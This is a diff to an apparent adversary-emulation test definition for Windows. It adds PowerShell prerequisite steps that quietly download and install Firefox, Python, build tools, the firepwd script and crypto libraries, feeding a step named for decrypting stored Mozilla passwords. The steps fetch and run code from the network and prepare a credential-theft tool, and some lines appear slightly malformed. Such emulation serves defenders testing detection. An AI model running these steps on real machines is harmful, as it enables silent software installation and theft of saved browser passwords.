@@ -29,6 +29,57 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        Firefox profile directory must be present
+      inline: |
+        if (get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\" -erroraction silentlycontinue) {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest "https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi" -outfile "PathToAtomicsFolder\..\ExternalPayloads\firefox.msi"
+        msiexec.exe /i "PathToAtomicsFolder\..\ExternalPayloads\firefox.msi" /quiet
+        sleep -s 30
+        start-process "$env:programfiles\Mozilla Firefox\firefox.exe".
+        sleep -s 5
+        stop-process -name "firefox"
+        }}
+      executor: powershell
+    - name: |
+        Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}
+      inline: |
+        if (Test-Path "#{VS_CMD_Path}") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
+        invoke-webrequest "https://aka.ms/vs/17/release/vs_BuildTools.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\VS_BuildTools.exe"
+        write-host "Visual Studio Build Tools (Desktop Development with C++) must be installed manually. Please run the installer from PathToAtomicsFolder\..\ExternalPayloads\VS_BuildTools.exe."
+        }}
+      executor: powershell
+    - name: |
+        Python must be installed
+      inline: |
+        if (Test-Path "#{Python_Path}") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
+        invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"
+        Start-Process -FilePath "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
+        }}
+      executor: powershell
+    - name: |
+        Computer must have venv configured at #{venv_path}
+      inline: |
+        if (Test-Path -Path "#{venv_path}") { exit 0 } else { {py -m venv "#{venv_path}"
+        } }
+      executor: powershell
+    - name: |
+        Firepwd must exist at #{Firepwd_Path}
+      inline: |
+        if (Test-Path "#{Firepwd_Path}") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
+        Invoke-WebRequest "https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py" -outfile "#{Firepwd_Path}"
+        }}
+      executor: powershell
+    - name: "Pycryptodome library must be installed \n"
+      inline: |
+        if (#{venv_path}\Scripts\pip.exe show pycryptodome) {exit 0} else {{if (test-path "#{VS_CMD_Path}"){#{venv_path}\Scripts\pip.exe install pycryptodome | out-null | cmd /c %comspec% /k "#{VS_CMD_Path}" | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq"}
+        }}
+      executor: powershell
+    - name: "Pyasn1 library must be installed \n"
+      inline: |
+        if (#{venv_path}\Scripts\pip.exe show pyasn1) {exit 0} else {{if (test-path "#{VS_CMD_Path}") & {#{venv_path}\Scripts\pip.exe install pyasn1 | out-null | cmd /c %comspec% /k "#{VS_CMD_Path}" | out-null} else {write-host "Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq."}
+        }}
+      executor: powershell
     - name: decrypt-mozilla-passwords-with-firepwd.py
       inline: |
         $PasswordDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
